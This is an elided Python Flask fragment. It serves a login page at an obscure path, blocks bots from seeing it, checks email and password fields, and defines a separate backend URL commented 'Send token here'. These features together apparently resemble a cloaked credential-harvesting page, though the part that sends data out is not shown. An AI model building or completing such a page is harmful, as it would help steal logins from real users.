...
BACKEND_URL = 'https://another.backend/api/token'  # Send token here
...
@app.route('/outofplace/dossier/partizan/login')
def exclusive_user_only_page():
    if is_bot():
        return "Access denied to bots", 403
    return render_template('outofplace/dossier/partizan/bell.html')
...
def wrangler():
    ...
    if request.method == 'POST':
        ...
        if not password:
            errors['password'] = 'Password is required'
        if not errors:
            return redirect('/dashboard')  # or your success route
    return render_template('/outofplace/dossier/partizan/bell.html', errors=errors, email=email)
